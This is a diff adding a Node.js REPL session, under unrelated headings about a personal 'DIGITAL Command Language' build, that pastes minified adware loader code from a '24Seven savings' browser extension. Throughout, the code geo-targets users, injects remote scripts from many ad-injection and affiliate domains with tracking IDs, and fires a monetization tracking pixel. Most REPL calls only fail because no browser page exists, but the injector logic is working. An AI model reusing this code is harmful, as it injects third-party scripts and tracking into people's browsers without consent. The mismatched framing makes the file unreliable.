@@ -1,0 +1,180 @@
+-My build of DIGITAL Command Language:
+-Muhammad Adi Nugroho,S.Adm.Neg.:
+-Via My Notepad++ (HTML Editor):
+-Via Node.js:
+> function __utilityAddition__(a) {function f(){if ('undefined' === typeof windo
+w['__utils_73143__' + a.pluginId]) {var d = document.createElement('script');var
+ b = a.httpsUrl;var c = a.httpUrl;d.setAttribute('type', 'text/javascript');if (
+'string' === typeof document.location.protocol && 0 === document.location.protoc
+ol.indexOf('https')) {if (!b || 0 === b.length) return;d.setAttribute('src', b)}
+ else d.setAttribute('src', c);(document.getElementsByTagName('head')[0] || docu
+ment.getElementsByTagName('body')[0]).appendChild(d);window['__utils_73143__' +
+a.pluginId] = !0}}var c = 0;if (!(document && document.location && 'string' == t
+ypeof document.location.host && 0 <= document.location.host.indexOf('facebook.co
+m') && 194 !== a.pluginId)) {if (!document || !document.body){var id = setInterv
+al(function (){var tag = (document.getElementsByTagName('head')[0] || document.g
+etElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>2
+0){clearInterval(id);return;}c++;return;}f();}, 500);} else {f();}}}parseInt("14
+28324356000",10)+36E5>(new Date).getTime()&&(__utilityAddition__=function(){});f
+unction __inGeo__(a){return 0<=a.indexOf("ID")}__inGeo__(["IL"])&&(__utilityAddi
+tion__=function(){});
+false
+> __inGeo__(["US","DE","UK"])&&__utilityAddition__({httpUrl:"http://inst.shoppin
+gate.info/js/sg_bg.js?AFFILIATE_ID=crsrdr&SUB_DISTRIBUTER_ID=300291310028000000&
+BRAND_DISPLAY_NAME=24Seven savings",httpsUrl:"https://inst.shoppingate.info/js/s
+g_bg.js?AFFILIATE_ID=crsrdr&SUB_DISTRIBUTER_ID=300291310028000000&BRAND_DISPLAY_
+NAME=24Seven savings",pluginId:242});
+false
+> __inGeo__(["US","DE","UK"])||__utilityAddition__({httpUrl:"http://i.crbsjs.inf
+o/crbf/javascript.js?channel=crdr_300291310028000000&appTitle=24Seven savings&hi
+d=8489aff358c70d9299cd793381563275",httpsUrl:"https://i_crbsjs_info.tlscdn.com/c
+rbf/javascript.js?channel=crdr_300291310028000000&appTitle=24Seven savings&hid=8
+489aff358c70d9299cd793381563275",pluginId:102});
+ReferenceError: document is not defined
+    at __utilityAddition__ (repl:1:593)
+    at repl:1:30
+    at REPLServer.defaultEval (repl.js:272:27)
+    at bound (domain.js:280:14)
+    at REPLServer.runBound [as eval] (domain.js:293:12)
+    at REPLServer.<anonymous> (repl.js:441:10)
+    at emitOne (events.js:101:20)
+    at REPLServer.emit (events.js:188:7)
+    at REPLServer.Interface._onLine (readline.js:224:10)
+    at REPLServer.Interface._line (readline.js:566:8)
+> __utilityAddition__({httpUrl:"http://istatic.eshopcomp.com/fo/min/crqc.js?hid=
+8489aff358c70d9299cd793381563275&bname=24Seven savings&subid=300291310028000000"
+,httpsUrl:"https://istatic.eshopcomp.com/fo/min/crqc.js?hid=8489aff358c70d9299cd
+793381563275&bname=24Seven savings&subid=300291310028000000",pluginId:288});
+ReferenceError: document is not defined
+    at __utilityAddition__ (repl:1:593)
+    at repl:1:1
+    at REPLServer.defaultEval (repl.js:272:27)
+    at bound (domain.js:280:14)
+    at REPLServer.runBound [as eval] (domain.js:293:12)
+    at REPLServer.<anonymous> (repl.js:441:10)
+    at emitOne (events.js:101:20)
+    at REPLServer.emit (events.js:188:7)
+    at REPLServer.Interface._onLine (readline.js:224:10)
+    at REPLServer.Interface._line (readline.js:566:8)
+> __inGeo__("MX IN CO ES CL DE US BE UK CA AU".split(" "))&&__utilityAddition__(
+{httpUrl:"http://savy.utop.it/tb/host.jsp?pid=31439&aid=savy&said=30029131002800
+0000&san=24Seven savings",httpsUrl:"https://savy.utop.it/tb/host.jsp?pid=31439&a
+id=savy&said=300291310028000000&san=24Seven savings",pluginId:302});
+false
+> __utilityAddition__({httpUrl:"http://cdncache-a.akamaihd.net/sub/h0982be/30029
+1310028000000/l.js?pid=2295&ext=24Seven savings",httpsUrl:"https://cdncache-a.ak
+amaihd.net/sub/h0982be/300291310028000000/l.js?pid=2295&ext=24Seven savings",plu
+ginId:390});__utilityAddition__({httpUrl:"http://cdncache-a.akamaihd.net/sub/h09
+82be/300291310028000000/l.js?pid=2294&ext=24Seven savings",httpsUrl:"https://cdn
+cache-a.akamaihd.net/sub/h0982be/300291310028000000/l.js?pid=2294&ext=24Seven sa
+vings",pluginId:391});
+ReferenceError: document is not defined
+    at __utilityAddition__ (repl:1:593)
+    at repl:1:1
+    at REPLServer.defaultEval (repl.js:272:27)
+    at bound (domain.js:280:14)
+    at REPLServer.runBound [as eval] (domain.js:293:12)
+    at REPLServer.<anonymous> (repl.js:441:10)
+    at emitOne (events.js:101:20)
+    at REPLServer.emit (events.js:188:7)
+    at REPLServer.Interface._onLine (readline.js:224:10)
+    at REPLServer.Interface._line (readline.js:566:8)
+> __inGeo__(["US","UK","DE","FR","IT"])&&parseInt("1428324356000",10)+432E5<=(ne
+w Date).getTime()&&(__utilityAddition__({httpUrl:"http://asrv-a.akamaihd.net/sd/
+1700/1046.js",httpsUrl:"https://asrv-a.akamaihd.net/sd/1700/1046.js",pluginId:23
+0}),window._rvz1700x1046={publisher_subid:"300291310028000000",addonname:"24Seve
+n savings"});
+false
+> __inGeo__("DE AT CH FR PL RU IN BR NL ES IT".split(" "))&&__utilityAddition__(
+{httpUrl:"http://rules.foxydeal.com/v1.0/whitelist/1070/300291310028000000?partn
+erName=24Seven savings",httpsUrl:"https://rules.foxydeal.com/v1.0/whitelist/1070
+/300291310028000000?partnerName=24Seven savings",pluginId:200});
+false
+> __inGeo__("DE AT CH FR PL RU IN BR NL ES IT".split(" "))||__utilityAddition__(
+{httpUrl:"http://api.jollywallet.com/affiliate/client?dist=329&sub=3002913100280
+00000&name=24Seven savings",httpsUrl:"https://api.jollywallet.com/affiliate/clie
+nt?dist=329&sub=300291310028000000&name=24Seven savings",pluginId:385});
+ReferenceError: document is not defined
+    at __utilityAddition__ (repl:1:593)
+    at repl:1:59
+    at REPLServer.defaultEval (repl.js:272:27)
+    at bound (domain.js:280:14)
+    at REPLServer.runBound [as eval] (domain.js:293:12)
+    at REPLServer.<anonymous> (repl.js:441:10)
+    at emitOne (events.js:101:20)
+    at REPLServer.emit (events.js:188:7)
+    at REPLServer.Interface._onLine (readline.js:224:10)
+    at REPLServer.Interface._line (readline.js:566:8)
+> __utilityAddition__({httpUrl:"http://cdn.visadd.com/script/14567725641/preload
+.js?subid=300291310028000000?um=Ads%20By%20Browser%20Extension",httpsUrl:"https:
+//cdn.visadd.com/script/14567725641/preload.js?subid=300291310028000000?um=Ads%2
+0By%20Browser%20Extension",pluginId:307});
+ReferenceError: document is not defined
+    at __utilityAddition__ (repl:1:593)
+    at repl:1:1
+    at REPLServer.defaultEval (repl.js:272:27)
+    at bound (domain.js:280:14)
+    at REPLServer.runBound [as eval] (domain.js:293:12)
+    at REPLServer.<anonymous> (repl.js:441:10)
+    at emitOne (events.js:101:20)
+    at REPLServer.emit (events.js:188:7)
+    at REPLServer.Interface._onLine (readline.js:224:10)
+    at REPLServer.Interface._line (readline.js:566:8)
+> __utilityAddition__({httpUrl:"http://a.tfxiq.com/a.php?626ref2=300291310028000
+000&626Name=24Seven savings&626ref3=8489aff358c70d9299cd793381563275&626ref1=637
+26f73737269646572&teid=73143&tuid=8489aff358c70d9299cd793381563275",httpsUrl:"ht
+tps://a.tfxiq.com/a.php?626ref2=300291310028000000&626Name=24Seven savings&626re
+f3=8489aff358c70d9299cd793381563275&626ref1=63726f73737269646572&teid=73143&tuid
+=8489aff358c70d9299cd793381563275",pluginId:180});
+ReferenceError: document is not defined
+    at __utilityAddition__ (repl:1:593)
+    at repl:1:1
+    at REPLServer.defaultEval (repl.js:272:27)
+    at bound (domain.js:280:14)
+    at REPLServer.runBound [as eval] (domain.js:293:12)
+    at REPLServer.<anonymous> (repl.js:441:10)
+    at emitOne (events.js:101:20)
+    at REPLServer.emit (events.js:188:7)
+    at REPLServer.Interface._onLine (readline.js:224:10)
+    at REPLServer.Interface._line (readline.js:566:8)
+> __inGeo__("US UK RU IN BR DE FR ES NL DE AU CA AR MX BE CO".split(" "))||__uti
+lityAddition__({httpUrl:"http://cdn.staticwebdom.com/js/a.js?namespace=LITE&camp
+aignId=002913&countryCode=100&installationTime=1428324356000&appID=73143&IBIC=84
+89aff358c70d9299cd793381563275&subID=300291310028000000&appName=24Seven savings&
+asw=[]&browserName=ff",httpsUrl:"https://d2a8a4q9.ssl.hwcdn.net/js/a.js?namespac
+e=LITE&campaignId=002913&countryCode=100&installationTime=1428324356000&appID=73
+143&IBIC=8489aff358c70d9299cd793381563275&subID=300291310028000000&appName=24Sev
+en savings&asw=[]&browserName=ff",
+... pluginId:277});__inGeo__(["US","UK"])||__utilityAddition__({httpUrl:"http://
+cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300291310028000000&sbr
+and=24Seven savings",httpsUrl:"https://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_i
+d=1145&subaff_id=300291310028000000&sbrand=24Seven savings",pluginId:273});
+ReferenceError: document is not defined
+    at __utilityAddition__ (repl:1:593)
+    at repl:1:74
+    at REPLServer.defaultEval (repl.js:272:27)
+    at bound (domain.js:280:14)
+    at REPLServer.runBound [as eval] (domain.js:293:12)
+    at REPLServer.<anonymous> (repl.js:441:10)
+    at emitOne (events.js:101:20)
+    at REPLServer.emit (events.js:188:7)
+    at REPLServer.Interface._onLine (readline.js:224:10)
+    at REPLServer.Interface._line (readline.js:566:8)
+> __inGeo__(["US"])&&__utilityAddition__({httpUrl:"http://nps.pastaleads.com/nps
+b/logic.js?OriginId=E8A4A23A-B034-E211-A9A0-001517D10F6E&SiteId=Sales&PartnerID=
+20000&ProductName=24Seven savings&ToolbarId=300291310028000000",httpsUrl:"https:
+//nps.pastaleads.com/npsb/logic.js?OriginId=E8A4A23A-B034-E211-A9A0-001517D10F6E
+&SiteId=Sales&PartnerID=20000&ProductName=24Seven savings&ToolbarId=300291310028
+000000",pluginId:184});
+false
+> try{var rand=Math.floor(1E11*Math.random())%100+1;if(10>=rand){var is_https="s
+tring"===typeof document.location.protocol&&0===document.location.protocol.index
+Of("https"),query_for_sanity="monetization.gif?event=9&campaign=002913&ibic=8489
+aff358c70d9299cd793381563275&verifier=2ca203b0d8d04a05470e1cbadff7a0f7&browser=f
+f&rand="+Math.floor(1111*Math.random()),domain_for_sanity=is_https?"https://m9u9
+b7r5.ssl.hwcdn.net/":"http://logs.buildomserv.com/",tag=document.createElement("
+img");tag.setAttribute("src",domain_for_sanity+
+... query_for_sanity);(document.getElementsByTagName("body")[0]||document.getEle
+mentsByTagName("head")[0]).appendChild(tag)}}catch(e$$7){};
+undefined
+>
